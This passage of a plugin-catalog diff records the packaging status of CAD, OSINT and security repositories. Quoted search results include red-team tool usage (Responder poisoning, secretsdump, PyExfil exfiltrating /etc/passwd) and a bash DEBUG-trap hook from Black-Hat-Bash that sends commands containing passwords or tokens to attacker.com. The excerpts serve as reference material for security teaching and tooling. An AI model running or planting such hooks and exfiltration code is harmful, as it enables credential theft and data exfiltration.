\"aliases\": [\"M3 set screw\", \"DIN 913 M3x5\", \"DIN913 M3x5\"], \"standard\": {\"body\": \"DIN\", \"number\": \"913\", \"designation\": \"DIN 913\"}, \"attributes\": {\"thread\": \"M3\", \"lengthMm\": 5, \"nominalSize\": \"M3 x 5\", \"driveStyle\": \"hex-socket\"}, \"stepUrl\": \"https://media.githubusercontent.com/media/earthtojake/step.parts/c6113328a5695b976a010a203a90fe86191769bf/catalog/step/din913_set_screw_m3x5.step\", \"glbUrl\": \"https://8ljrorjug0ps5al0.public.blob.vercel-storage.com/preview/glb/din913_set_screw_m3x5-cd2cf212d016cdb87975b70fe68c15f190b462b805f9f74b8b2e404065b4962a.glb\", \"pngUrl\": \"https://8ljrorjug0ps5al0.public.blob.vercel-storage.com/preview/png/din913_set_screw_m3x5-cd2cf212d016cdb87975b70fe68c15f190b462b805f9f74b8b2e404065b4962a.png\", \"byteSize\": 31410, \"sha256\": \"cd2cf212d016cdb87975b70fe68c15f190b462b805f9f74b8b2e404065b4962a\", \"pageUrl\": \"https://www.step.parts/parts/din913_set_screw_m3x5\", \"apiUrl\": \"https://api.step.parts/v1/parts/din913_set_screw_m3x5\"}]"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "57f75d29fb3c1783234a4f6c11a26d1dca9491eceb8d501bbed682e726f14792",
+            "digest": "57f75d29fb3c1783234a4f6c11a26d1dca9491eceb8d501bbed682e726f14792",
+            "extension_id": "step-parts",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-step-parts-1.0.0-57f75d29fb3c1783234a4f6c11a26d1dca9491eceb8d501bbed682e726f14792/pandamonium-plugin-step-parts-57f75d29fb3c1783234a4f6c11a26d1dca9491eceb8d501bbed682e726f14792.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:11:03.619632+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 1
+            }
+          }
+        }
+      ],
+      "coverage": "Real official api.step.parts /v1/parts search for M3 with original part metadata through native dispatch.",
+      "outstanding": "Geometry LFS pointers are not bundled CAD binaries. Each downloaded model keeps its own license; search does not claim geometry generation.",
+      "license": "MIT original code; model-specific third-party licenses",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 16,
+      "name": "text-to-cad",
+      "requested_source": "https://github.com/earthtojake/text-to-cad",
+      "target": "CAD generation integration",
+      "resolved_source": "https://github.com/earthtojake/text-to-cad",
+      "source_revision": "3e4dfdeef2cbd5804c369592b59620132188a150",
+      "packages": [
+        {
+          "extension_id": "text-to-cad",
+          "recipe": "integrations/repository-packages/text-to-cad/proposal.json",
+          "source_revision": "3e4dfdeef2cbd5804c369592b59620132188a150",
+          "prepared_sha256": "28269204434b02eef63309afa50a14b1ea42495f5ece2dd73fed1344ac9e244a",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "skill": "bambu-labs",
+              "native_body_chars": 8533
+            },
+            {
+              "skill": "cad",
+              "native_body_chars": 28142
+            },
+            {
+              "skill": "cad-viewer",
+              "native_body_chars": 7778
+            },
+            {
+              "skill": "dfam-check",
+              "native_body_chars": 5422
+            },
+            {
+              "skill": "dxf",
+              "native_body_chars": 15987
+            },
+            {
+              "skill": "gcode",
+              "native_body_chars": 6212
+            },
+            {
+              "skill": "sdf",
+              "native_body_chars": 8357
+            },
+            {
+              "skill": "sendcutsend",
+              "native_body_chars": 13189
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "28269204434b02eef63309afa50a14b1ea42495f5ece2dd73fed1344ac9e244a",
+            "digest": "28269204434b02eef63309afa50a14b1ea42495f5ece2dd73fed1344ac9e244a",
+            "extension_id": "text-to-cad",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-text-to-cad-1.0.0-28269204434b02eef63309afa50a14b1ea42495f5ece2dd73fed1344ac9e244a/pandamonium-plugin-text-to-cad-28269204434b02eef63309afa50a14b1ea42495f5ece2dd73fed1344ac9e244a.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:14:12.988787+00:00",
+            "validation": {
+              "kind": "native_skills",
+              "count": 8
+            }
+          }
+        },
+        {
+          "extension_id": "text-to-cad-robotics",
+          "recipe": "integrations/repository-packages/text-to-cad-robotics/proposal.json",
+          "source_revision": "3e4dfdeef2cbd5804c369592b59620132188a150",
+          "prepared_sha256": "fc7491f17d612b7896bc704f60d31d6eaa8f78b04dc394b666426934545e6ccf",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "skill": "srdf",
+              "native_body_chars": 9495
+            },
+            {
+              "skill": "step-parts",
+              "native_body_chars": 6108
+            },
+            {
+              "skill": "urdf",
+              "native_body_chars": 7835
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "fc7491f17d612b7896bc704f60d31d6eaa8f78b04dc394b666426934545e6ccf",
+            "digest": "fc7491f17d612b7896bc704f60d31d6eaa8f78b04dc394b666426934545e6ccf",
+            "extension_id": "text-to-cad-robotics",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-text-to-cad-robotics-1.0.0-fc7491f17d612b7896bc704f60d31d6eaa8f78b04dc394b666426934545e6ccf/pandamonium-plugin-text-to-cad-robotics-fc7491f17d612b7896bc704f60d31d6eaa8f78b04dc394b666426934545e6ccf.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:14:38.212089+00:00",
+            "validation": {
+              "kind": "native_skills",
+              "count": 3
+            }
+          }
+        }
+      ],
+      "coverage": "All eleven canonical CAD skills admitted and read natively across two packages (eight CAD/fabrication plus three robotics/parts).",
+      "outstanding": "Split preserves the existing 64-file admission limit. These are instructions; cadgen, slicers, viewers and printer/device execution require owner setup and were not executed. Two unrelated credential-shaped test files excluded.",
+      "license": "MIT",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 17,
+      "name": "ORACLE",
+      "requested_source": "https://github.com/MADPANDA3D/ORACLE",
+      "target": "Preserve working native integration; test distributable package",
+      "resolved_source": "https://github.com/MADPANDA3D/ORACLE",
+      "source_revision": "b619e2a17015d0e1c044fb273677b00abccdbede",
+      "packages": [],
+      "coverage": "Preserved existing native ORACLE integration; pinned distributable-source scan was attempted and failed closed with extension_scan_source_secret.",
+      "outstanding": "Outstanding: prepare a secret-clean distributable source and disposable browser bridge/runtime validation. Existing native web/live bridge is outside current isolated publisher adapters. No changes to Leo's installed ORACLE or its origin/configuration.",
+      "license": "MIT code plus noncommercial/other bundled-data notices",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": null,
+        "licenses": null,
+        "error": "ExtensionScanError: extension_scan_source_secret",
+        "has_installable_draft": false,
+        "finding_categories": []
+      }
+    },
+    {
+      "number": 18,
+      "name": "Robin",
+      "requested_source": "https://github.com/apurvsinghgautam/robin",
+      "target": "Security/research integration",
+      "resolved_source": "https://github.com/apurvsinghgautam/robin",
+      "source_revision": "7bda35f57408190642608bb78e196b791a1b2152",
+      "packages": [],
+      "coverage": "Pinned Robin CLI/source and real requirements inspected; static scan completed.",
+      "outstanding": "Needs setup: disposable Tor SOCKS connectivity plus a selected model/provider or Ollama runtime. No live dark-web search or model result claimed; an isolated adapter and operation proof remain outstanding.",
+      "license": "MIT",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "python_cli",
+        "licenses": [
+          "MIT"
+        ],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": [
+          "dangerous_pattern",
+          "oversized_blob"
+        ]
+      }
+    },
+    {
+      "number": 19,
+      "name": "cvelistV5",
+      "requested_source": "https://github.com/CVEProject/cvelistV5",
+      "target": "Dataset search/retrieval and update provenance",
+      "resolved_source": "https://github.com/CVEProject/cvelistV5",
+      "source_revision": "9ea9ff3852f0e9342443ca3378576f2048216c6b",
+      "packages": [],
+      "coverage": "Pinned CVEProject tree and update provenance. The truncated recursive response already contains 77,154 files / 752,298,701 bytes.",
+      "outstanding": "Outstanding: full dataset exceeds 50,000-file / 512 MiB snapshot bounds. Design bounded revision-aware shards/update retrieval and confirm CVE terms; no sample masquerades as a complete indexed dataset.",
+      "license": "CVE terms/attribution require explicit review",
+      "status": "outstanding"
+    },
+    {
+      "number": 20,
+      "name": "RedTeam-Tools",
+      "requested_source": "https://github.com/A-poc/RedTeam-Tools",
+      "target": "Collection discovery; linked tools installed separately",
+      "resolved_source": "https://github.com/A-poc/RedTeam-Tools",
+      "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2",
+      "packages": [
+        {
+          "extension_id": "redteam-tools",
+          "recipe": "integrations/repository-packages/redteam-tools/proposal.json",
+          "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2",
+          "prepared_sha256": "5b589c940a90296d695c86bbc46f8a019ca4f62f33eebb071e77fcd5cce5cd61",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "redteam_tools__search",
+              "arguments": {
+                "query": "network",
+                "limit": 3
+              },
+              "result": {
+                "results": [
+                  {
+                    "path": "README.md",
+                    "line": 1769,
+                    "text": "wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh && \\\nsudo bash ./install.sh\n```\n\n**Usage:**\n\nOnce King Phisher has been installed please follow the [wiki page](https://github.com/rsmusllp/king-phisher/wiki/Getting-Started) to setup SSH, Database config, SMTP server etc.\n\n![image](https://user-images.githubusercontent.com/100603074/208217377-a6d36613-4ffe-486d-a630-99ed1bb7ed2d.png)\n\nExecution\n====================\n\n### [\ud83d\udd19](#tool-list)[Responder](https://github.com/SpiderLabs/Responder)\n\nResponder is a tool for poisoning the LLMNR and NBT-NS protocols on a network, to allow for credential capture and arbitrary code execution.\n\nThe LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) protocols are used by Windows systems to resolve hostnames to IP addresses on a local network. If a hostname cannot be resolved using these protocols, the system will broadcast a request for the hostname to the local network. \n\nResponder listens for these broadcasts and responds with a fake IP address, tricking the requesting system into sending its credentials to the attacker.\n\n**Install:** \n\n```bash\ngit clone https://github.com/SpiderLabs/Responder#usage\ncd Responder\n```\n\n**Usage:** \n\n```bash\n# Running the tool\n./Responder.py [options]\n\n# Typical usage\n./Responder.py -I eth0 -wrf\n```\n\nFull usage information can be found [here](https://github.com/SpiderLabs/Responder#usage).\n\n![image](https://user-images.githubusercontent.com/100603074/210266150-b9cbd4a0-d07b-435a-8fa9-bc0b88d2c6ae.png)\n\n*Image used from https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/*\n\n### [\ud83d\udd19](#tool-list)[secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)\n\n",
+                    "source_url": "https://github.com/A-poc/RedTeam-Tools/blob/7b52217a9856aceedc9ff4b1e0b11e1667e22fd2/README.md",
+                    "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2",
+                    "content_sha256": "947ce0015b4edb1295ee1524de3491bb5fc7468f1809ddf15e8129231865b9e5"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 2237,
+                    "text": "### [\ud83d\udd19](#tool-list)[Impacket](https://github.com/fortra/impacket)\n\nImpacket provides a set of low-level Python bindings for various network protocols, including SMB, Kerberos, and LDAP, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.\n\nIt also includes a number of command-line tools that can be used to perform various tasks such as dumping SAM databases, enumerating domain trusts, and cracking Windows passwords.\n\n**Install:** \n\n```bash\npython3 -m pip install impacket\n```\n\n**Install: (With Example Scripts)** \n\nDownload and extract [the package](https://github.com/fortra/impacket), then navigate to the install folder and run...\n\n```bash\npython3 -m pip install .\n```\n\n**Usage:** \n\n```bash\n# Extract NTLM hashes with local files\nsecretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL\n\n# Gets a list of the sessions opened at the remote hosts\nnetview.py domain/user:password -target 192.168.10.2\n\n# Retrieves the MSSQL instances names from the target host.\nmssqlinstance.py 192.168.1.2\n\n# This script will gather data about the domain's users and their corresponding email addresses.\nGetADUsers.py domain/user:password@IP\n```\n\nGreat [cheat sheet](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) for Impacket usage.\n\n![image](https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png)\n\n### [\ud83d\udd19](#tool-list)[Empire](https://github.com/EmpireProject/Empire)\n\nEmpire is a post-exploitation framework that allows you to generate payloads for establishing remote connections with victim systems.\n\n",
+                    "source_url": "https://github.com/A-poc/RedTeam-Tools/blob/7b52217a9856aceedc9ff4b1e0b11e1667e22fd2/README.md",
+                    "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2",
+                    "content_sha256": "863f931538394083e92d992356b0b16a8fe3f09f78676cd255076e4c2bf8790b"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 4507,
+                    "text": "python3 cloakify.py TEXT.txt ciphers/desserts.ciph > TEXT.cloaked\n\n# De-Cloakify the text\npython3 decloakify.py TEXT.cloaked ciphers/desserts.ciph\n```\n\n![image](https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png)\n\n![image](https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png)\n\n### [\ud83d\udd19](#tool-list)[PyExfil](https://github.com/ytisf/PyExfil)\n\n\"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios.\"\n\n**Install:** \n\n```bash\ngit clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install\n```\n\n**Usage:** (Full Usage [here](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))\n\n#### HTTP Cookies\n\n```python\nfrom pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen\n\n# For Client (exfil)\nsend_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)\n\n# For Server (collecting)\nlisten(local_addr='127.0.0.1', local_port=80)\n```\n\n#### ICMP Echo 8\n\n```python\nfrom pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener\n\n# For Client (exfil)\nip_addr = \"127.0.0.1\"\nsend_file(ip_addr, src_ip_addr=\"127.0.0.1\", file_path=\"\", max_packetsize=512, SLEEP=0.1)\n\n# For Server (collecting)\ninit_listener(ip_addr, saving_location=\"/tmp/\")\n```\n\n#### NTP Request\n\n```python\nfrom pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT\n\n# For Client (exfil)\nip_addr = \"127.0.0.1\"\nexfiltrate(\"/etc/passwd\", ip_addr, time_delay=0.1)\n\n# For Server (collecting)\nntp_listener(ip=\"0.0.0.0\", port=NTP_UDP_PORT)\n```\n\n",
+                    "source_url": "https://github.com/A-poc/RedTeam-Tools/blob/7b52217a9856aceedc9ff4b1e0b11e1667e22fd2/README.md",
+                    "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2",
+                    "content_sha256": "4d0554d5db9e78cf762d5a462306cc44f1fd3e3b72c9e41dfc508aeffdccc847"
+                  }
+                ],
+                "vectorized": false
+              }
+            },
+            {
+              "tool": "redteam_tools__status",
+              "arguments": {},
+              "result": {
+                "chunks": 106,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/A-poc/RedTeam-Tools.git",
+                "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2"
+              }
+            },
+            {
+              "tool": "redteam_tools__refresh",
+              "arguments": {},
+              "result": {
+                "chunks": 106,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/A-poc/RedTeam-Tools.git",
+                "source_revision": "7b52217a9856aceedc9ff4b1e0b11e1667e22fd2"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "not_published",
+            "reason": "Publication blocked: upstream collection has no detected project license. Linked tools require separate source/installation decisions."
+          }
+        }
+      ],
+      "coverage": "Real native status, cited collection search and refresh; linked tools remain reference data.",
+      "outstanding": "Publication blocked: upstream collection has no detected project license. Linked tools require separate source/installation decisions.",
+      "license": "No upstream project license found",
+      "status": "outstanding"
+    },
+    {
+      "number": 21,
+      "name": "BlueTeam-Tools",
+      "requested_source": "https://github.com/A-poc/BlueTeam-Tools",
+      "target": "Collection discovery; linked tools installed separately",
+      "resolved_source": "https://github.com/A-poc/BlueTeam-Tools",
+      "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c",
+      "packages": [
+        {
+          "extension_id": "blueteam-tools",
+          "recipe": "integrations/repository-packages/blueteam-tools/proposal.json",
+          "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c",
+          "prepared_sha256": "1edd5e1fab5f59791c5a3e9b6d751722bf250a6aff8d31f1e5597a91855e2aca",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "blueteam_tools__search",
+              "arguments": {
+                "query": "analysis",
+                "limit": 3
+              },
+              "result": {
+                "results": [
+                  {
+                    "path": "README.md",
+                    "line": 1718,
+                    "text": "> iS;is        # list sections and symbols (same as rabin2 -Ss)\n> pdf; agf     # print function and show control-flow-graph in ascii-art\n> oo+;w hello  # reopen in rw mode and write a string in the current offset\n> ?*~...       # interactive filter all command help messages\n> q            # quit\n```\n\nGreat usage book [here](https://book.rada.re/).\n\n![image](https://user-images.githubusercontent.com/100603074/218871325-90800880-ee58-4a61-9372-fa9cb09f6bf3.png)\n\n*Image used from https://github.com/radareorg/radare2*\n\n### [\ud83d\udd19](#tool-list)[dnSpy](https://github.com/dnSpy/dnSpy)\n\ndnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies. \n\nMain features:\n\n- Debug .NET and Unity assemblies\n- Edit .NET and Unity assemblies\n\n**Install: (Build)** \n\n```bash\ngit clone --recursive https://github.com/dnSpy/dnSpy.git\ncd dnSpy\n./build.ps1 -NoMsbuild\n```\n\n**Usage:** \n\n```bash\ndnSpy.exe\n```\n\nNice tutorial page [here](https://7d2dsdx.github.io/Tutorials/index.html?StartingdnSpy.html).\n\n![image](https://user-images.githubusercontent.com/100603074/218871411-7eb20cb7-f2e8-4d29-98a9-d5820a138c8e.png)\n\n*Image used from https://7d2dsdx.github.io/Tutorials/index.html?StartingdnSpy.html*\n\n### [\ud83d\udd19](#tool-list)[malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/)\n\nThis is a site with over 2,200 blog entries about malicious network traffic. Almost every post on the site has pcap files or malware samples (or both).\n\nThe site also contains a number of traffic analysis exercises, including technical blog posts outlining techniques being used by threat actors.\n\n**Usage:** \n\nVisit [https://www.malware-traffic-analysis.net/](https://www.malware-traffic-analysis.net/).\n\n",
+                    "source_url": "https://github.com/A-poc/BlueTeam-Tools/blob/1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c/README.md",
+                    "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c",
+                    "content_sha256": "2a10832d840ccc62055b84c63188bda973d3060ce8eb3b4b34a02a6a4b2e40ba"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 1846,
+                    "text": "[TestDisk Documentation PDF - 60 Pages](https://www.cgsecurity.org/testdisk.pdf)\n\n![image](https://user-images.githubusercontent.com/100603074/210668956-4ed75998-bd6d-48cf-a2e7-dfa75656eece.png)\n\n*Image used from https://www.cgsecurity.org/wiki/*\n\nDigital Forensics\n====================\n\n*Tools for conducting forensic investigations of digital devices and systems, including tools for collecting and analyzing evidence.*\n\n### [\ud83d\udd19](#tool-list)[SANS SIFT](https://www.sans.org/tools/sift-workstation/)\n\nSANS SIFT (SANS Investigative Forensic Toolkit) is a powerful toolkit for forensic analysis and incident response. \n\nIt is a collection of open source and commercial tools that can be used to perform forensic analysis on a wide range of systems, including Windows, Linux, and Mac OS X. The SANS SIFT kit is designed to be run on a forensic workstation, which is a specialized computer that is used to perform forensic analysis on digital evidence.\n\nThe SANS SIFT kit is particularly useful for blue teamers, as it provides a wide range of tools and resources that can be used to investigate incidents, respond to threats, and perform forensic analysis on compromised systems.\n\n**Install:** \n\n1. Visit [https://www.sans.org/tools/sift-workstation/](https://www.sans.org/tools/sift-workstation/).\n\n2. Click the 'Login to Download' button and input (or create) your SANS Portal account credentials to download the virtual machine. \n\n3. Once you have booted the virtual machine, use the credentials below to gain access.\n\n```\nLogin = sansforensics\nPassword = forensics\n```\n\n**Note:** *Use to elevate privileges to root while mounting disk images.*\n\nAdditional install options [here](https://www.sans.org/tools/sift-workstation/).\n\n**Usage:** \n\n```bash\n# Registry Parsing - Regripper\n",
+                    "source_url": "https://github.com/A-poc/BlueTeam-Tools/blob/1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c/README.md",
+                    "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c",
+                    "content_sha256": "10824028517e794298c5edbd9a2f0eb872ebc0c4b293df2314fd70e64539757a"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 832,
+                    "text": "It was developed by Digital Forensic and Incident Response (DFIR) professionals who needed a powerful and efficient way to hunt for specific artifacts and monitor activities across fleets of endpoints. Velociraptor provides you with the ability to more effectively respond to a wide range of digital forensic and cyber incident response investigations and data breaches:\n\nFeatures:\n\n- Reconstruct attacker activities through digital forensic analysis\n- Hunt for evidence of sophisticated adversaries\n- Investigate malware outbreaks and other suspicious network activities\n- Monitory continuously for suspicious user activities, such as files copied to USB devices\n- Discover whether disclosure of confidential information occurred outside the network\n- Gather endpoint data over time for use in threat hunting and future investigations\n\n\n**Install:** \n\nDownload the binary from the [release page](https://github.com/Velocidex/velociraptor/releases).\n\n**Usage:** \n\n```\nvelociraptor gui\n```\n\nFull usage information can be found [here](https://docs.velociraptor.app/).\n\n![image](https://user-images.githubusercontent.com/100603074/218200327-3f5ab599-11f1-46dc-8f28-b27c1258224a.png)\n\n*Image used from https://docs.velociraptor.app*\n\n### [\ud83d\udd19](#tool-list)[SysmonSearch](https://github.com/JPCERTCC/SysmonSearch)\n\nSysmonSearch makes event log analysis more effective and less time consuming, by aggregating event logs generated by Microsoft's Sysmon.\n\n  SysmonSearch uses Elasticserach and Kibana (and Kibana plugin).\n  * **Elasticserach**  \n    Elasticsearch collects/stores Sysmon's event log.\n  * **Kibana**  \n    Kibana provides user interface for your Sysmon's event log analysis. The following functions are implemented as Kibana plugin.\n    * Visualizes Function  \n",
+                    "source_url": "https://github.com/A-poc/BlueTeam-Tools/blob/1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c/README.md",
+                    "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c",
+                    "content_sha256": "cd6a89ab8d271609c4b1edd986a0727715442dbab2a93c2e333d9b4783299224"
+                  }
+                ],
+                "vectorized": false
+              }
+            },
+            {
+              "tool": "blueteam_tools__status",
+              "arguments": {},
+              "result": {
+                "chunks": 59,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/A-poc/BlueTeam-Tools.git",
+                "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c"
+              }
+            },
+            {
+              "tool": "blueteam_tools__refresh",
+              "arguments": {},
+              "result": {
+                "chunks": 59,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/A-poc/BlueTeam-Tools.git",
+                "source_revision": "1bca7fd57c4a0a72f4aeb3fc1ea93ddfa63f1e7c"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "not_published",
+            "reason": "Publication blocked: upstream collection has no detected project license. Linked tools require separate source/installation decisions."
+          }
+        }
+      ],
+      "coverage": "Real native status, cited collection search and refresh; linked tools remain reference data.",
+      "outstanding": "Publication blocked: upstream collection has no detected project license. Linked tools require separate source/installation decisions.",
+      "license": "No upstream project license found",
+      "status": "outstanding"
+    },
+    {
+      "number": 22,
+      "name": "SpiderFoot",
+      "requested_source": "https://github.com/smicallef/spiderfoot",
+      "target": "Service/CLI research tooling",
+      "resolved_source": "https://github.com/smicallef/spiderfoot",
+      "source_revision": "0f815a203afebf05c98b605dba5cf0475a0ee5fd",
+      "packages": [],
+      "coverage": "Pinned SpiderFoot service/CLI and typed helpers inspected; static audit completed.",
+      "outstanding": "Outstanding: provision a disposable compatible dependency/service runtime, resolve the credential-shaped Citadel module finding, then validate real research operations. Scanner recognized a vendored BSD notice but misses the untitled root MIT grant; do not publish under the vendored license alone.",
+      "license": "MIT root grant; retained bundled notices",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "python_cli",
+        "licenses": [
+          "BSD-3-Clause"
+        ],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": [
+          "dangerous_pattern",
+          "oversized_blob",
+          "secret"
+        ]
+      }
+    },
+    {
+      "number": 23,
+      "name": "theHarvester",
+      "requested_source": "https://github.com/laramies/theHarvester",
+      "target": "CLI research tooling",
+      "resolved_source": "https://github.com/laramies/theHarvester",
+      "source_revision": "78a78f08d4a0d6d9bf6058effa8ddafb9e2d070b",
+      "packages": [],
+      "coverage": "Pinned theHarvester CLI, scope parser and Python requirements inspected; static audit completed.",
+      "outstanding": "Needs setup: private Python >=3.14 (app test runtime is 3.10), provider selection/credentials and sanitized distributable source. Real harvesting and generated adapter remain outstanding. GPL-2.0 appears in README/COPYING/LICENSES and is not recognized by the current heuristic.",
+      "license": "GPL-2.0",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "python_cli",
+        "licenses": [],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": [
+          "dangerous_pattern",
+          "license",
+          "secret"
+        ]
+      }
+    },
+    {
+      "number": 24,
+      "name": "Black-Hat-Bash",
+      "requested_source": "https://github.com/dolevf/Black-Hat-Bash",
+      "target": "Knowledge/collection integration; no blanket execution of examples",
+      "resolved_source": "https://github.com/dolevf/Black-Hat-Bash",
+      "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9",
+      "packages": [
+        {
+          "extension_id": "black-hat-bash",
+          "recipe": "integrations/repository-packages/black-hat-bash/proposal.json",
+          "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9",
+          "prepared_sha256": "0d667e3c8a4a546ad75575e48312dcdffd59826fc9f36b7c96701220cbb27a65",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "black_hat_bash__search",
+              "arguments": {
+                "query": "bash",
+                "limit": 3
+              },
+              "result": {
+                "results": [
+                  {
+                    "path": "ch10/profile_hook.sh",
+                    "line": 1,
+                    "text": "#!/bin/bash\n\nhook() {\n  case \"${BASH_COMMAND}\" in\n    mysql*)\n       if echo \"${BASH_COMMAND}\" | grep -- \"-p\\|--password\"; then\n          curl https://attacker.com \\\n              -H \"Content-Type:application/json\" \\\n              -d \"{\\\"command\\\":\\\"${BASH_COMMAND}\\\"}\" \\\n              --max-time 3 \\\n              --connect-timeout 3 \\\n              -s &> /dev/null\n       fi\n      ;;\n    curl*)\n       if echo \"${BASH_COMMAND}\" | grep -ie \"token\" \\\n                                        -ie \"apikey\" \\\n                                        -ie \"api_token\" \\\n                                        -ie \"bearer\" \\\n                                        -ie \"authorization\"; then\n          curl https://attacker.com \\\n              -H \"Content-Type:application/json\" \\\n              -d \"{\\\"command\\\":\\\"${BASH_COMMAND}\\\"}\" \\\n              --max-time 3 \\\n              --connect-timeout 3 \\\n              -s &> /dev/null\n       fi\n      ;;\n  esac\n}\n\ntrap 'hook' DEBUG\n\n",
+                    "source_url": "https://github.com/dolevf/Black-Hat-Bash/blob/92d9287305255aab1e433cd54755acf21f5bd3f9/ch10/profile_hook.sh",
+                    "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9",
+                    "content_sha256": "f0d135c522ddd10045497f47f5f079bb77e6c7fb18a2ba3858b80407570d3446"
+                  },
+                  {
+                    "path": "ch01/README.md",
+                    "line": 1,
+                    "text": "# Bash Basics\n",
+                    "source_url": "https://github.com/dolevf/Black-Hat-Bash/blob/92d9287305255aab1e433cd54755acf21f5bd3f9/ch01/README.md",
+                    "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9",
+                    "content_sha256": "de194445a810d9219b2c7103479d3ca8e1f84609a0794d8b8e73af68c649b53f"
+                  },
+                  {
+                    "path": "ch01/local_scope_variable.sh",
+                    "line": 1,
+                    "text": "#!/bin/bash\n\nPUBLISHER=\"No Starch Press\"\n\nprint_name(){\n  local name\n  name=\"Black Hat Bash\"\n  echo \"${name} by ${PUBLISHER}\" \n}\n\nprint_name\n\necho \"Variable ${name} will not be printed here because it is a local variable.\"\n",
+                    "source_url": "https://github.com/dolevf/Black-Hat-Bash/blob/92d9287305255aab1e433cd54755acf21f5bd3f9/ch01/local_scope_variable.sh",
+                    "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9",
